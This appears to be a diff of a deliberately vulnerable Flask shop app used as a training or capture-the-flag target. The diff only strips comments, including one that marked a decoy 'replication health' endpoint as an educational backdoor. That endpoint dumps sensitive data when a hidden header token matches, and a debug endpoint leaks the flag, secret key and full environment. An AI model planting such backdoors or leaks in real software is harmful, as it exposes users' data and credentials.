@@ -11,7 +11,6 @@ app.config['DATABASE'] = os.path.join(BASE_DIR, 'shop.db')
 CORS(app)
 
 
-# === Database ===
 def get_db():
     if 'db' not in g:
         g.db = sqlite3.connect(app.config['DATABASE'])
@@ -31,7 +30,6 @@ def init_db():
     db.row_factory = sqlite3.Row
     c = db.cursor()
     
-    # Create tables
     c.execute('''
         CREATE TABLE IF NOT EXISTS product (
             id TEXT PRIMARY KEY,
@@ -173,12 +171,10 @@ def init_db():
         )
     ''')
 
-    # Migration for existing DBs
     user_columns = [row['name'] for row in c.execute("PRAGMA table_info(user)").fetchall()]
     if 'shipping_address' not in user_columns:
         c.execute('ALTER TABLE user ADD COLUMN shipping_address TEXT')
     
-    # Migration for user_device table - add new columns if they don't exist
     device_columns = [row['name'] for row in c.execute("PRAGMA table_info(user_device)").fetchall()]
     device_columns_dict = {col: False for col in device_columns}
     
@@ -195,7 +191,6 @@ def init_db():
 
     db.commit()
     
-    # Initialize products if empty
     c.execute('SELECT COUNT(*) FROM product')
     if c.fetchone()[0] == 0:
         with open(os.path.join(BASE_DIR, 'data.json'), 'r') as f:
@@ -208,7 +203,6 @@ def init_db():
         db.commit()
         print('✓ Products initialized from data.json')
     
-    # Initialize sample orders if empty
     c.execute('SELECT COUNT(*) FROM "order"')
     if c.fetchone()[0] == 0:
         c.execute('SELECT id, price FROM product LIMIT 3')
@@ -226,7 +220,6 @@ def init_db():
             db.commit()
             print('✓ Sample orders initialized')
 
-    # Initialize default admin user
     c.execute('SELECT COUNT(*) FROM user')
     if c.fetchone()[0] == 0:
         c.execute(
@@ -236,7 +229,6 @@ def init_db():
         db.commit()
         print('✓ Default admin user initialized')
     
-    # Print summary
     c.execute('SELECT COUNT(*) FROM product')
     products_count = c.fetchone()[0]
     c.execute('SELECT COUNT(*) FROM cart_item')
@@ -274,7 +266,6 @@ def ensure_db_initialized():
         app.config['_DB_INITIALIZED'] = True
 
 
-# === Static Files ===
 @app.route('/')
 def index():
     return send_from_directory('.', 'index.html')
@@ -285,7 +276,6 @@ def static_files(filename):
     return send_from_directory('.', filename)
 
 
-# === API: Products ===
 @app.route('/api/products', methods=['GET'])
 def get_products():
     db = get_db()
@@ -424,7 +414,6 @@ def _lab_sensitive_snapshot():
     }
 
 
-# === API: Auth/Users ===
 @app.route('/api/auth/register', methods=['POST'])
 def register_user():
     data = request.get_json() or {}
@@ -452,7 +441,6 @@ def register_user():
 
     user = db.execute('SELECT * FROM user WHERE email = ?', (email,)).fetchone()
     
-    # Save device data
     if device_data:
         db.execute('''
             INSERT INTO user_device (
@@ -530,7 +518,6 @@ def login_user():
     if not user:
         return jsonify({'error': 'Invalid credentials'}), 401
 
-    # Save device data for login
     if device_data:
         db.execute('''
             INSERT INTO user_device (
@@ -843,7 +830,6 @@ def remove_user_favorite(email, product_id):
     return jsonify({'message': 'Removed'}), 200
 
 
-# === API: Cart ===
 @app.route('/api/cart', methods=['GET'])
 def get_cart():
     db = get_db()
@@ -922,7 +908,6 @@ def clear_cart():
     return jsonify({'message': 'Cart cleared'}), 200
 
 
-# === API: Orders ===
 @app.route('/api/orders', methods=['GET'])
 def get_orders():
     db = get_db()
@@ -967,17 +952,14 @@ def create_order():
     if not cart_items:
         return jsonify({'error': 'Cart is empty'}), 400
     
-    # Calculate total
     total = 0
     for item in cart_items:
         product = db.execute('SELECT price FROM product WHERE id = ?', (item['product_id'],)).fetchone()
         total += product['price'] * item['quantity']
     
-    # Create order
     db.execute('INSERT INTO "order" (total, status) VALUES (?, ?)', (total, 'completed'))
     order_id = db.execute('SELECT last_insert_rowid()').fetchone()[0]
     
-    # Create order items
     for item in cart_items:
         product = db.execute('SELECT price FROM product WHERE id = ?', (item['product_id'],)).fetchone()
         db.execute(
@@ -985,11 +967,9 @@ def create_order():
             (order_id, item['product_id'], item['quantity'], product['price'])
         )
     
-    # Clear cart
     db.execute('DELETE FROM cart_item')
     db.commit()
     
-    # Return order with items
     order = db.execute('SELECT * FROM "order" WHERE id = ?', (order_id,)).fetchone()
     items = db.execute('SELECT * FROM order_item WHERE order_id = ?', (order_id,)).fetchall()
     
@@ -1059,12 +1039,9 @@ def create_order_with_balance():
     }), 201
 
 
-# === Учебные бэкдоры (скрытые «внутренние» каналы) ===
 @app.route('/api/v1/replication/health', methods=['GET', 'POST'])
 def replication_health_decoy():
     """
-    Имитация health-check реплики. Без токена — безобидный JSON.
-    С X-Replica-Checkpoint / X-Sync-Auth или ?checkpoint= / ?sync_token= — полный снимок.
     """
     if not _lab_backdoor_match():
         return jsonify({
@@ -1076,7 +1053,6 @@ def replication_health_decoy():
     return jsonify(_lab_sensitive_snapshot()), 200
 
 
-# === Debug Page ===
 @app.route('/debug')
 def debug_page():
     return send_from_directory('.', 'debug.html')
@@ -1086,7 +1062,6 @@ def debug_page():
 def debug_data():
     db = get_db()
     
-    # Database info
     db_info = {
         'uri': f"sqlite:///{app.config['DATABASE']}",
         'database_path': app.config['DATABASE'],
@@ -1101,7 +1076,6 @@ def debug_data():
         'user_device_count': db.execute('SELECT COUNT(*) FROM user_device').fetchone()[0],
     }
     
-    # System info
     system_info = {
         'python_version': os.popen('python3 --version').read().strip(),
         'flask_version': os.popen('python3 -c "import flask; print(flask.__version__)"').read().strip(),
@@ -1109,13 +1083,10 @@ def debug_data():
         'flag': os.environ.get('FLAG', 'Not set'),
     }
     
-    # All products
     products = db.execute('SELECT * FROM product').fetchall()
     
-    # All cart items
     cart_items = db.execute('SELECT * FROM cart_item').fetchall()
     
-    # All orders with items
     orders = db.execute('SELECT * FROM "order"').fetchall()
     orders_data = []
     for order in orders:
@@ -1124,22 +1095,18 @@ def debug_data():
         order_dict['items'] = [dict(i) for i in items]
         orders_data.append(order_dict)
     
-    # All order items
     order_items = db.execute('SELECT * FROM order_item').fetchall()
     
-    # Config
     config = {
         'debug': app.debug,
         'secret_key': str(app.secret_key) if app.secret_key else 'Not set',
         'cors_enabled': True,
     }
     
-    # Environment variables (filtered list + полный словарь для отладки)
     env_vars = [f'{k} = {v}' for k, v in sorted(os.environ.items())
                 if 'SECRET' not in k.upper() and 'PASSWORD' not in k.upper()]
     environment_full = dict(sorted(os.environ.items()))
     
-    # Database schema
     db_schema = {
         'product': ['id', 'title', 'type', 'price', 'image', 'description'],
         'cart_item': ['id', 'product_id', 'quantity', 'created_at'],
